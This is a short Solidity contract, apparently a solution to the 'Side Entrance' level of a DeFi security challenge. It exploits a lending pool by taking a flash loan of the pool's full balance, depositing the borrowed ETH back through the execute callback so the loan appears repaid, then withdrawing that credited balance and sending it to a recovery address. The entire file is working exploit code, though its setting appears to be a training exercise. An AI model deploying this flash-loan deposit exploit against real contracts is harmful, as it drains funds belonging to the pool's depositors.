// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {SideEntranceLenderPool} from "../side-entrance/SideEntranceLenderPool.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
contract HackerSideEntrance {
    SideEntranceLenderPool public pool;
    address public recovery;

    constructor(SideEntranceLenderPool _pool, address _recovery) {
        pool = _pool;
        recovery = _recovery;
    }

    function attack() external {
        uint256 balanceBefore = address(pool).balance;
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        // transfer the ETH to the recovery wallet
        SafeTransferLib.safeTransferETH(recovery, balanceBefore);
    }

    function execute() external payable {
        SideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
    }

    receive() external payable {}
}
